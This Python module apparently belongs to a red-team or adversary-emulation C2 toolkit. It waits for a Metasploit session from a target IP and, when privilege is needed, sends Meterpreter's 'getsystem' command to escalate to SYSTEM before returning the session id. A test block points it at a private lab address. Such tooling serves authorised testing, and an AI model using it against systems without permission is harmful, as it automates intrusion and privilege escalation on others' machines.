""" 
Wait for an Metasploit session (Meterpreter or Shell) with a given IP address
"""
from time import sleep
from c2_settings import MSF_SERVER, MSF_PWD
from pymetasploit.msfrpc import MsfRpcClient

def run(client, ip_address, need_privilege=False, time_out_sec = 180):
    """
    Given an IP, waits for session, else Raise ValueError if timeout
    \n:param client: MsfRpcClient object
    \n:param ip_address: target's IP address
    \n:param need_privilege: set to true if need privileged session
    \n:param time_out_sec: time out in seconds
    \n:return type: integer (session id)
    """
    time_out = time_out_sec
    agent_name = ""
    while time_out > 0:
        for key, value in client.sessions.list.items():
            if(value['session_host']==ip_address):
                if(not need_privilege):
                    return key
                else: # MSF is rather different from Empire
                    shell = client.sessions.session(key)
                    shell.write('getsystem') # needs explicit getsystem
                    sleep(5)
                    r = shell.read()
                    while len(r) == 0: # results are not immediate
                        sleep(5)
                        r = shell.read()
                        if ("denied" in r): 
                            break # denied, give up
                        if (time_out < 0):
                            raise ValueError('Wait for session timeout')                        
                    if("got system" in r): # return only when got system
                        return key
            
        time_out -= 1
        sleep(1)
    raise ValueError('Wait for session timeout')


# for unit testing of each technique
if __name__ == '__main__':
    client = MsfRpcClient(MSF_PWD, server=MSF_SERVER,ssl=False)
    #print(str(run(client, '192.168.181.174'))) # session that's non-privileged
    print(str(run(client, '192.168.181.174', True))) # session without high-integrity